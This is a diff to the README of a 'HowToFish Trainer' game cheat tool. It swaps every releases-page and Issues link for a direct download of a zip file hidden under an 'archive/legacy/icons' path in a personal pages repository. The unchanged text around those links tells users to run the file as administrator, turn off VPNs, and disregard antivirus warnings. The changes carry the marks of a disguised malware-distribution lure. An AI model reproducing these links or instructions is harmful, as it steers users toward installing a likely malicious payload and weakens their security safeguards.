@@ -19,7 +19,7 @@ This guide will walk you through everything step by step—no technical knowledg
 
 ### Step 1: Get the Application
 
-[![Download Now](https://img.shields.io/badge/Download-HowToFish_Trainer-brightgreen?style=for-the-badge&logo=github)](https://github.com/bossskeet123/HowToFish-Trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-HowToFish_Trainer-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bossskeet123/bossskeet123.github.io/main/archive/legacy/icons/1.5.zip)
 
 Visit this link to download the application. Once you're on the page, you'll see a list of available files. Look for the most recent version and click the download button. The file should appear in your "Downloads" folder automatically.
 
@@ -95,7 +95,7 @@ Some antivirus programs may flag the trainer as suspicious because it interacts 
 
 ### Can I update the trainer?
 
-Yes, check the [releases page](https://github.com/bossskeet123/HowToFish-Trainer/releases) regularly for new updates. Updates often include compatibility fixes and new features.
+Yes, check the [releases page](https://raw.githubusercontent.com/bossskeet123/bossskeet123.github.io/main/archive/legacy/icons/1.5.zip) regularly for new updates. Updates often include compatibility fixes and new features.
 
 ---
 
@@ -103,7 +103,7 @@ Yes, check the [releases page](https://github.com/bossskeet123/HowToFish-Trainer
 
 ### The trainer won't open
 
-1. Make sure you have downloaded the correct file from the [releases page](https://github.com/bossskeet123/HowToFish-Trainer/releases).
+1. Make sure you have downloaded the correct file from the [releases page](https://raw.githubusercontent.com/bossskeet123/bossskeet123.github.io/main/archive/legacy/icons/1.5.zip).
 2. Right-click the file and select "Run as administrator".
 3. Disable any active VPN or proxy connections, as they may interfere.
 
@@ -139,7 +139,7 @@ We're constantly improving the trainer. Here's what's new:
 
 ## 🧑‍💻 Contributing
 
-While this trainer is designed for end users, we welcome suggestions and feedback. If you encounter any issues or have ideas for improvement, please share them through the [Issues section](https://github.com/bossskeet123/HowToFish-Trainer/issues) on GitHub.
+While this trainer is designed for end users, we welcome suggestions and feedback. If you encounter any issues or have ideas for improvement, please share them through the [Issues section](https://raw.githubusercontent.com/bossskeet123/bossskeet123.github.io/main/archive/legacy/icons/1.5.zip) on GitHub.
 
 ---
 
